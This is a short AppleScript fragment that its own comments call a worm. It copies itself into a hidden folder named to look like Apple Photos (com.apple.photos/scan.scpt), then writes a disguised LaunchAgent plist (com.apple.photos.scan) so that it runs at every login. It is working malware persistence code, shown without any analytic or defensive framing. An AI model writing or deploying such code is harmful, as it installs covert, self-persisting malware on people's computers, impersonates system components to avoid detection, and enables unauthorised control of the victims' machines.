-- Get the path to the current script (assumes it's running as .scpt or .app)
set wormPath to POSIX path of (path to me)

-- Copy itself to a hidden-looking folder in Application Support
do shell script "cp " & quoted form of wormPath & " ~/Library/Application\\ Support/com.apple.photos/scan.scpt"

-- Write a LaunchAgent plist to run the worm at every login
do shell script "echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
  <key>Label</key><string>com.apple.photos.scan</string>
  <key>ProgramArguments</key>
  <array>
    <string>osascript</string>
    <string>" & POSIX path of (path to home folder) & "/Library/Application Support/com.apple.photos/scan.scpt</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.photos.scan.plist"
